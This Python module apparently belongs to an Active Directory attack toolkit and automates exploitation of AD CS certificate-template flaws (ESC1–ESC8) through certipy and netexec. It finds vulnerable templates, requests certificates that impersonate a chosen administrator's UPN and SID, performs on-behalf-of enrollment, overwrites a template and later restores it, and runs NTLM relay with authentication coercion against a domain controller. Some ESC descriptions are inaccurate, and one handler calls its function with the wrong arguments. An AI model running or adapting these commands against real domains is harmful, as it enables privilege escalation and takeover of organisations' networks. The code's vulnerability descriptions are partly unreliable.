import os, subprocess, glob, shutil, re, threading
from datetime import datetime
from utils import general, commands,  ldap_queries
from modules import ad_bloodhound

current_date = general.current_date

def describe_esc(esc):
    descriptions = {
        "ESC1:": f"\033[91mEnrollee supplies subject and template allows client authentication.\033[0m",
        "ESC2:": f"\033[91mTemplate can be used for any purpose.\033[0m",
        "ESC3:": f"\033[91mTemplate has Certificate Request Agent EKU set.\033[0m",
        "ESC4:": f"\033[91mUser has enrollment rights and SAN control (e.g., spoof DC).\033[0m",
        "ESC5:": f"\033[91muser can modify certificate template access control lists (e.g., Role Based Constrained Delegation RBCD)\033[0m",
        "ESC6:": f"\033[91mVulnerable if EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set (patched in May 2022 due to CVE-2022-26923)\033[0m",
        "ESC7:": f"\033[91mVulnerable if EDITF_ATTRIBUTESUBJECTALTNAME2 can be modified (need administrator CA rights or ManageCA rights over CA)\033[0m",
        "ESC8:": f"\033[91mVulnerable web enrollment endpoint and at least one certificate template enabled that allows domain computer enrollment and client authentication\033[0m",
        "ESC9:": f"\033[91mDangerous permissions allow tampering with template ACLs.\033[0m",
        "ESC10:": f"\033[91mAbuses StrongCertificateBindingEnforcement or CertificateMappingMethods registry keys and spoofs UPN\033[0m",
        "ESC11:": f"\033[91mAbuses IF_ENFORCEENCRYPTICERTREQUEST between client and CA\033[0m"
    }
    return descriptions.get(esc, "Unknown vulnerability.")

def run_certipy_find(args):
    required_args = [args.domain_user, args.domain_pass, args.domain, args.dc_ip]
    if not all(required_args):
        print("[-] Certipy requirements not met: missing username, password, domain, or dc-ip.")
        return

    user_at_domain = f"{args.domain_user}@{args.domain}"
    cmd = f"certipy.pyz find -enabled -u {user_at_domain} -p {args.domain_pass} -dc-ip {args.dc_ip} -stdout | tee ActiveDirectory/ADCS/{current_date}_FindResults.txt"
    commands.single_command(cmd, args.dc_ip, "bright_cyan")

def find_esc_vulns(certipy_dir):
    certipy_dir = os.path.expanduser(certipy_dir)
    esc_vulns = []

    for root, _, files in os.walk(certipy_dir):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    lines = f.readlines()

                current_ca = None
                current_template = None
                current_escs = []

                i = 0
                while i < len(lines):
                    line = lines[i].strip()

                    # Capture CA Name
                    ca_match = re.search(r"CA Name\s*[:=]\s*(.+)", line)
                    if ca_match:
                        current_ca = ca_match.group(1).strip()

                    # Capture Template Name
                    template_match = re.search(r"Template Name\s*[:=]\s*(.+)", line)
                    if template_match:
                        current_template = template_match.group(1).strip()
                        current_escs = []

                    # Parse ESC* vulnerabilities listed in vulnerability blocks
                    if line.startswith("[!] Vulnerabilities") or line.startswith("Vulnerabilities"):
                        j = i + 1
                        while j < len(lines):
                            vuln_line = lines[j].strip()
                            match = re.match(r"^(ESC\d+)", vuln_line)
                            if match:
                                esc = match.group(1)
                                if current_template:
                                    if esc not in current_escs:
                                        esc_vulns.append((esc + ":", current_template, current_ca))
                                        current_escs.append(esc)
                                else:
                                    esc_vulns.append((esc + ":", None, current_ca))
                            elif vuln_line == "" or vuln_line.startswith("Template Name"):
                                break
                            j += 1
                        i = j - 1

                    i += 1

    if not esc_vulns:
        print("\033[91m[-] No ESC1–ESC8 vulnerabilities found.\033[0m")
        return None

    print("\033[92m[+] Vulnerable Templates Detected:\n\033[0m")
    for idx, (esc_type, template, ca) in enumerate(esc_vulns, 1):
        print(f"{idx}. Template: {template or '[N/A]'} | CA: {ca}")
        print(f"  -> {esc_type} {describe_esc(esc_type)}")

    choice = input("\nSelect a template to use (by number): ")
    try:
        selected = esc_vulns[int(choice) - 1]
        print(f"\n\033[94m[Selected Template]\033[0m\n  Type: {selected[0]}\n  Template: {selected[1] or '[N/A]'}\n  CA: {selected[2]}\n")
        return selected
    except (ValueError, IndexError):
        print("\033[91m[-] Invalid selection.\033[0m")
        return None

# === ESC Handlers ===
def handle_ESC1(args, selected_template, selected_admin, target):
    certipy_ESC1(args, selected_template, selected_admin, target)

def handle_ESC2(args, selected_template, selected_admin, target):
    q = input(f"\033[93m[?] ESC2 can be exploited 2 ways: ESC1-style(e), on-behalf-of(o):\033[0m ").lower()
    if q == "e":
        certipy_ESC1(args, selected_template, selected_admin, target)
    elif q == "o":
        certipy_ESC2(args, selected_template, selected_admin, target)

def handle_ESC3(args, selected_template, selected_admin, target):
    certipy_ESC2(args, selected_template, selected_admin, target)

def handle_ESC4(args, selected_template, selected_admin, target):
    certipy_ESC4(args, selected_template, selected_admin, target)

def handle_ESC5(args, selected_template, selected_admin, target):
    certipy_ESC5(args, selected_template, selected_admin, target)

def handle_ESC6(args, selected_template, selected_admin, target):
    certipy_ESC6(args, selected_template, selected_admin, target)

def handle_ESC7(args, selected_template, selected_admin, target):
    certipy_ESC7(args, selected_template, target)

def handle_ESC8(args, selected_template, selected_admin, target):
    certipy_ESC8(args, target)


# === ESC Exploits ===
def certipy_ESC1(args, selected_template, selected_admin, target):
    template_name = selected_template[1]
    ca_name = selected_template[2]
    admin_account, sid = selected_admin.split(":")
    upn = admin_account.strip()
    cmdsid = sid.strip()

    #request admin cert
    command = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -upn {upn} -template {template_name} -ca {ca_name} -target {target} -sid {cmdsid}"
    print(f"\n\033[96m[*] Requesting certificate using Certipy template '{template_name}' for user '{admin_account.strip()}'...\n\033[0m\033[0m")
    print(f"\033[96m[*] Running: {command}\033[0m")
    subprocess.run(command, shell=True)

def certipy_ESC2(args, selected_template, selected_admin, target):
    template_name = selected_template[1]
    ca_name = selected_template[2]
    admin_account, sid = selected_admin.split(":")
    admin_account2, garbage = admin_account.split("@")
    userSID = ldap_queries.get_user_sid(args, args.domain_user)

    #Request user cert
    esc2_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template {template_name} -ca {ca_name} -sid {userSID}"
    print(f"\033[96mESC2 attack with: {esc2_cmd}\033[0m")
    subprocess.call(esc2_cmd, shell=True)

    netbiosname = ldap_queries.get_netbios_name(args)

    #Request on behalf of admin
    esc2_pfx_cmd = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -target {target} -template User -ca {ca_name} -on-behalf-of '{netbiosname}\\{admin_account2}' -pfx {args.domain_user}.pfx -sid {sid}"
    print(f"\033[96m[*] Running {esc2_pfx_cmd}\033[0m")
    subprocess.call(esc2_pfx_cmd, shell=True)

def certipy_ESC4(args, selected_template, selected_admin, target):
    template_name = selected_template[1]
    ca_name = selected_template[2]

    # Overwrite template config
    esc4_write = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -template {template_name} -save-configuration ESC4Save -write-default-configuration" 
    print(f"\033[96m[*] Running {esc4_write}\033[0m")
    subprocess.run(esc4_write, shell=True)

    # Run ESC1 against modified template
    certipy_ESC1(args, selected_template, selected_admin, target)

    # Revert config
    esc4_revert = f"certipy.pyz template -u {args.domain_user}@{args.domain} -p {args.domain_pass} -template {template_name} -write-configuration ESC4Save.json"
    print(f"\033[96m[*]Running {esc4_revert}\033[0m")
    subprocess.run(esc4_revert, shell=True)

def certipy_ESC5(args, selected_template, selected_admin, target):
    print("[!] ESC5 exploitation not implemented.")

def certipy_ESC6(args, selected_template, selected_admin, target):
    template_name = "user"
    ca_name = selected_template[2]
    admin_account, sid = selected_admin.split(":")
    upn = admin_account.strip()
    cmdsid = sid.strip()

    #request admin cert (this is different from esc1 because ANY certificate could be used)
    command = f"certipy.pyz req -u {args.domain_user}@{args.domain} -p {args.domain_pass} -upn {upn} -template {template_name} -ca {ca_name} -target {target} -sid {cmdsid}"
    print(f"\n\033[96m[*] Requesting certificate using Certipy template '{template_name}' for user '{upn}'...\n\033[0m\033[0m")
    print(f"\033[96m[*] Running: {command}\033[0m")
    subprocess.run(command, shell=True)

def certipy_ESC7(args, selected_template, selected_admin, target):
    print("[!] ESC7 exploitation not implemented.", target)

def certipy_ESC8(args, target):
    local_ip = general.get_local_ip()
    cmds = [
        f"certipy.pyz relay -target {target} -template DomainController | tee ActiveDirectory/ADCS/esc_8",
        f"nxc smb {args.dc_ip} -u {args.domain_user} -p {args.domain_pass} -d {args.domain} -M coerce_plus -o L={local_ip}"
    ]
    commands.threaded_commands(cmds, target, "cyan")
